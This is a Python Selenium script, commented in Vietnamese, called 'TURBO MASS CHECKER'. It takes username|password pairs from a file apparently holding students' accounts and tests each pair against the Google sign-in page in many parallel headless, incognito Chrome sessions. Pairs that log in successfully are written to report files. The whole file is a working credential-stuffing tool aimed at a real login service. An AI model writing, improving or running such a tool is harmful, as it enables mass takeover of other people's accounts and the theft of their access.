#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import time
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException, NoSuchElementException
import queue
import sys

class TurboMassChecker:
    def __init__(self, max_threads=8):
        self.max_threads = max_threads
        self.results_lock = threading.Lock()
        self.success_accounts = []
        self.wrong_password_accounts = []
        self.error_accounts = []
        self.processed_count = 0
        self.start_time = datetime.now()
        self.print_lock = threading.Lock()
        
    def thread_safe_log(self, message, level="INFO"):
        """Thread-safe logging"""
        with self.print_lock:
            timestamp = datetime.now().strftime("%H:%M:%S")
            icons = {"INFO": "🔵", "SUCCESS": "✅", "ERROR": "❌", "WARNING": "⚠️", "STEP": "🎯"}
            icon = icons.get(level, "📝")
            print(f"[{timestamp}] {icon} {message}")
    
    def create_headless_driver(self):
        """Tạo Chrome headless siêu nhanh"""
        try:
            chrome_options = Options()
            
            # HEADLESS - Không hiển thị UI
            chrome_options.add_argument('--headless')
            chrome_options.add_argument('--no-sandbox')
            chrome_options.add_argument('--disable-dev-shm-usage')
            chrome_options.add_argument('--disable-gpu')
            
            # TỐI ƯU TỐC ĐỘ EXTREME
            chrome_options.add_argument('--disable-images')
            chrome_options.add_argument('--disable-javascript')
            chrome_options.add_argument('--disable-plugins')
            chrome_options.add_argument('--disable-extensions')
            chrome_options.add_argument('--disable-loading-animation')
            chrome_options.add_argument('--disable-background-timer-throttling')
            chrome_options.add_argument('--disable-renderer-backgrounding')
            chrome_options.add_argument('--disable-backgrounding-occluded-windows')
            chrome_options.add_argument('--disable-client-side-phishing-detection')
            chrome_options.add_argument('--disable-sync')
            chrome_options.add_argument('--disable-translate')
            chrome_options.add_argument('--hide-scrollbars')
            chrome_options.add_argument('--mute-audio')
            
            # INCOGNITO
            chrome_options.add_argument('--incognito')
            chrome_options.add_argument('--disable-notifications')
            chrome_options.add_argument('--disable-save-password-bubble')
            chrome_options.add_argument('--disable-autofill')
            
            # VÔ HIỆU HÓA LOGGING
            chrome_options.add_argument('--disable-logging')
            chrome_options.add_argument('--log-level=3')
            chrome_options.add_argument('--silent')
            
            # TỐI ƯU MEMORY
            chrome_options.add_argument('--memory-pressure-off')
            chrome_options.add_argument('--max_old_space_size=4096')
            
            chrome_service = Service('driver/chromedriver.exe')
            driver = webdriver.Chrome(service=chrome_service, options=chrome_options)
            
            # Set timeout siêu ngắn
            driver.set_page_load_timeout(10)
            driver.implicitly_wait(3)
            
            return driver
            
        except Exception as e:
            self.thread_safe_log(f"❌ Lỗi tạo driver: {e}", "ERROR")
            return None
    
    def fast_find_element(self, driver, selectors, timeout=5):
        """Tìm element siêu nhanh"""
        for by, selector in selectors:
            try:
                wait = WebDriverWait(driver, timeout // len(selectors))
                element = wait.until(EC.presence_of_element_located((by, selector)))
                if element and element.is_displayed():
                    return element
            except:
                continue
        return None
    
    def turbo_input(self, driver, element, text):
        """Nhập text turbo"""
        try:
            # Phương pháp 1: JS trực tiếp (nhanh nhất)
            driver.execute_script("arguments[0].value = arguments[1];", element, text)
            driver.execute_script("arguments[0].dispatchEvent(new Event('input'));", element)
            return True
        except:
            try:
                # Phương pháp 2: Clear + send_keys
                element.clear()
                element.send_keys(text)
                return True
            except:
                return False
    
    def turbo_click(self, driver, element):
        """Click turbo"""
        try:
            # JS click (nhanh nhất)
            driver.execute_script("arguments[0].click();", element)
            return True
        except:
            try:
                element.click()
                return True
            except:
                return False
    
    def lightning_check_wrong_password(self, driver):
        """Kiểm tra sai password siêu nhanh"""
        try:
            # Lấy page source một lần
            page_source = driver.page_source.lower()
            
            # Kiểm tra các pattern lỗi
            error_patterns = [
                "wrong password",
                "incorrect password", 
                "try again",
                "forgot password",
                "couldn't sign you in",
                "sign-in failed"
            ]
            
            return any(pattern in page_source for pattern in error_patterns)
            
        except:
            return False
    
    def turbo_test_single_account(self, account_data):
        """Test một tài khoản với tốc độ turbo"""
        username, password, index = account_data
        thread_id = threading.current_thread().ident
        
        result = {
            "index": index,
            "username": username,
            "password": password,
            "status": "unknown",
            "thread_id": thread_id
        }
        
        driver = None
        try:
            # Tạo driver
            driver = self.create_headless_driver()
            if not driver:
                result["status"] = "error"
                result["description"] = "Không thể tạo driver"
                return result
            
            # Bước 1: Mở Google login
            driver.get("https://accounts.google.com/signin")
            time.sleep(1)  # Giảm xuống 1s
            
            # Bước 2: Nhập email siêu nhanh
            email_selectors = [
                (By.ID, "identifierId"),
                (By.NAME, "identifier"),
                (By.CSS_SELECTOR, 'input[type="email"]')
            ]
            
            email_input = self.fast_find_element(driver, email_selectors, timeout=4)
            if not email_input:
                result["status"] = "error"
                result["description"] = "Không tìm thấy ô email"
                return result
            
            if not self.turbo_input(driver, email_input, username):
                result["status"] = "error"
                result["description"] = "Không thể nhập email"
                return result
            
            # Bước 3: Click Next email
            next_selectors = [
                (By.ID, "identifierNext"),
                (By.CSS_SELECTOR, '[data-id="identifierNext"]')
            ]
            
            next_button = self.fast_find_element(driver, next_selectors, timeout=3)
            if not next_button:
                result["status"] = "error"
                result["description"] = "Không tìm thấy nút Next"
                return result
            
            if not self.turbo_click(driver, next_button):
                result["status"] = "error"
                result["description"] = "Không thể click Next"
                return result
            
            time.sleep(2)  # Giảm xuống 2s
            
            # Bước 4: Nhập password siêu nhanh
            password_selectors = [
                (By.NAME, "password"),
                (By.CSS_SELECTOR, 'input[type="password"]')
            ]
            
            password_input = self.fast_find_element(driver, password_selectors, timeout=6)
            if not password_input:
                result["status"] = "error"
                result["description"] = "Không tìm thấy ô password"
                return result
            
            if not self.turbo_input(driver, password_input, password):
                result["status"] = "error"
                result["description"] = "Không thể nhập password"
                return result
            
            # Bước 5: Click Next password
            password_next_selectors = [
                (By.ID, "passwordNext"),
                (By.CSS_SELECTOR, '[data-id="passwordNext"]')
            ]
            
            password_next = self.fast_find_element(driver, password_next_selectors, timeout=3)
            if not password_next:
                result["status"] = "error"
                result["description"] = "Không tìm thấy nút Next password"
                return result
            
            if not self.turbo_click(driver, password_next):
                result["status"] = "error"
                result["description"] = "Không thể click Next password"
                return result
            
            # Bước 6: Kiểm tra kết quả lightning
            time.sleep(3)  # Giảm xuống 3s
            
            if self.lightning_check_wrong_password(driver):
                result["status"] = "wrong_password"
                result["description"] = "Sai mật khẩu"
            else:
                result["status"] = "success" 
                result["description"] = "Đăng nhập thành công"
            
            return result
            
        except Exception as e:
            result["status"] = "error"
            result["description"] = f"Lỗi: {str(e)[:50]}"
            return result
        
        finally:
            if driver:
                try:
                    driver.quit()
                except:
                    pass
    
    def update_progress(self, result):
        """Cập nhật tiến trình thread-safe"""
        with self.results_lock:
            self.processed_count += 1
            
            if result["status"] == "success":
                self.success_accounts.append(result)
            elif result["status"] == "wrong_password":
                self.wrong_password_accounts.append(result)
            else:
                self.error_accounts.append(result)
            
            # Log progress mỗi 5 tài khoản
            if self.processed_count % 5 == 0:
                elapsed = datetime.now() - self.start_time
                speed = self.processed_count / elapsed.total_seconds() * 60 if elapsed.total_seconds() > 0 else 0
                
                self.thread_safe_log(
                    f"⚡ {self.processed_count} | ✅{len(self.success_accounts)} ❌{len(self.wrong_password_accounts)} 💥{len(self.error_accounts)} | {speed:.1f} tk/phút", 
                    "INFO"
                )
    
    def load_all_accounts(self):
        """Tải tất cả tài khoản"""
        self.thread_safe_log("📚 Tải tất cả tài khoản...", "STEP")
        
        try:
            with open("students_accounts.txt", 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            accounts = []
            for i, line in enumerate(lines):
                line = line.strip()
                if '|' in line:
                    username, password = line.split('|', 1)
                    accounts.append((username.strip(), password.strip(), i+1))
            
            self.thread_safe_log(f"✅ Đã tải {len(accounts)} tài khoản", "SUCCESS")
            return accounts
            
        except Exception as e:
            self.thread_safe_log(f"❌ Lỗi tải tài khoản: {e}", "ERROR")
            return []
    
    def save_progress_periodically(self):
        """Lưu tiến trình định kỳ"""
        try:
            if self.processed_count % 100 == 0 and self.processed_count > 0:
                timestamp = datetime.now().strftime('%H%M%S')
                filename = f"turbo_progress_{self.processed_count}_{timestamp}.txt"
                
                with self.results_lock:
                    with open(filename, "w", encoding="utf-8") as f:
                        f.write(f"# TURBO PROGRESS - {self.processed_count} TÀI KHOẢN\n")
                        f.write(f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n")
                        
                        f.write("## TÀI KHOẢN HOẠT ĐỘNG:\n")
                        for acc in self.success_accounts:
                            f.write(f"{acc['username']}|{acc['password']}\n")
                        
                        f.write(f"\n## THỐNG KÊ:\n")
                        f.write(f"- Thành công: {len(self.success_accounts)}\n")
                        f.write(f"- Sai mật khẩu: {len(self.wrong_password_accounts)}\n")
                        f.write(f"- Lỗi: {len(self.error_accounts)}\n")
                
                self.thread_safe_log(f"💾 Đã lưu: {filename}", "SUCCESS")
                
        except Exception as e:
            self.thread_safe_log(f"Lỗi lưu: {e}", "ERROR")
    
    def create_final_turbo_report(self):
        """Tạo báo cáo cuối cùng"""
        try:
            with open("accstatus.txt", "w", encoding="utf-8") as f:
                f.write("# TURBO MASS CHECKER - HEADLESS + MULTI-THREADING\n")
                f.write(f"# Thời gian: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write(f"# Threads: {self.max_threads}\n")
                f.write(f"# Tổng thời gian: {datetime.now() - self.start_time}\n\n")
                
                f.write(f"## TỔNG KẾT:\n")
                f.write(f"- Đăng nhập thành công: {len(self.success_accounts)}\n")
                f.write(f"- Sai mật khẩu: {len(self.wrong_password_accounts)}\n")
                f.write(f"- Lỗi kỹ thuật: {len(self.error_accounts)}\n")
                f.write(f"- Tổng đã xử lý: {self.processed_count}\n\n")
                
                f.write(f"## {len(self.success_accounts)} TÀI KHOẢN HOẠT ĐỘNG:\n")
                for acc in self.success_accounts:
                    f.write(f"{acc['username']}|{acc['password']}\n")
            
            self.thread_safe_log("✅ Đã tạo accstatus.txt", "SUCCESS")
            
        except Exception as e:
            self.thread_safe_log(f"Lỗi tạo báo cáo: {e}", "ERROR")
    
    def run_turbo_mass_test(self):
        """Chạy test turbo với multi-threading"""
        print("🚀 TURBO MASS CHECKER - HEADLESS + MULTI-THREADING")
        print("="*80)
        print(f"⚡ {self.max_threads} THREADS song song")
        print("👻 HEADLESS - Không hiển thị browser")
        print("🔥 TỐI ƯU EXTREME - Bỏ JS, ảnh, animation")
        print("❌ Logic: Có 'Wrong password' = SAI")
        print("✅ Logic: Không có = THÀNH CÔNG")
        print("="*80)
        
        accounts = self.load_all_accounts()
        if not accounts:
            return
        
        total_accounts = len(accounts)
        
        try:
            # Chạy với ThreadPoolExecutor
            with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
                # Submit tất cả jobs
                future_to_account = {
                    executor.submit(self.turbo_test_single_account, account): account 
                    for account in accounts
                }
                
                # Xử lý kết quả khi hoàn thành
                for future in as_completed(future_to_account):
                    try:
                        result = future.result()
                        self.update_progress(result)
                        self.save_progress_periodically()
                        
                    except Exception as e:
                        account = future_to_account[future]
                        self.thread_safe_log(f"❌ Lỗi TK {account[2]}: {e}", "ERROR")
            
            # Tạo báo cáo cuối
            self.create_final_turbo_report()
            
            # Tổng kết
            elapsed = datetime.now() - self.start_time
            speed = total_accounts / elapsed.total_seconds() * 60 if elapsed.total_seconds() > 0 else 0
            
            print(f"\n{'='*100}")
            self.thread_safe_log("🎉 TURBO HOÀN THÀNH!", "SUCCESS")
            print("="*100)
            print(f"📊 KẾT QUẢ CUỐI CÙNG:")
            print(f"   ✅ Thành công: {len(self.success_accounts)}/{total_accounts} ({len(self.success_accounts)/total_accounts*100:.1f}%)")
            print(f"   ❌ Sai mật khẩu: {len(self.wrong_password_accounts)}/{total_accounts} ({len(self.wrong_password_accounts)/total_accounts*100:.1f}%)")
            print(f"   💥 Lỗi: {len(self.error_accounts)}/{total_accounts} ({len(self.error_accounts)/total_accounts*100:.1f}%)")
            print(f"   ⏱️ Thời gian: {elapsed}")
            print(f"   🚀 Tốc độ: {speed:.1f} tài khoản/phút")
            print(f"   🔥 Threads: {self.max_threads}")
            print("="*100)
            
        except KeyboardInterrupt:
            self.thread_safe_log("⚠️ Dừng bởi người dùng", "WARNING")
            self.create_final_turbo_report()
        except Exception as e:
            self.thread_safe_log(f"❌ Lỗi: {e}", "ERROR")

def main():
    print("🚀 TURBO MASS CHECKER")
    print("Nhập số threads (mặc định 8, tối đa 16): ", end="")
    
    try:
        threads_input = input().strip()
        if threads_input:
            max_threads = min(int(threads_input), 16)
        else:
            max_threads = 8
    except:
        max_threads = 8
    
    print(f"🔥 Bắt đầu với {max_threads} threads...")
    
    checker = TurboMassChecker(max_threads=max_threads)
    checker.run_turbo_mass_test()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Tạm biệt!")
    except Exception as e:
        print(f"\n❌ Lỗi: {e}") 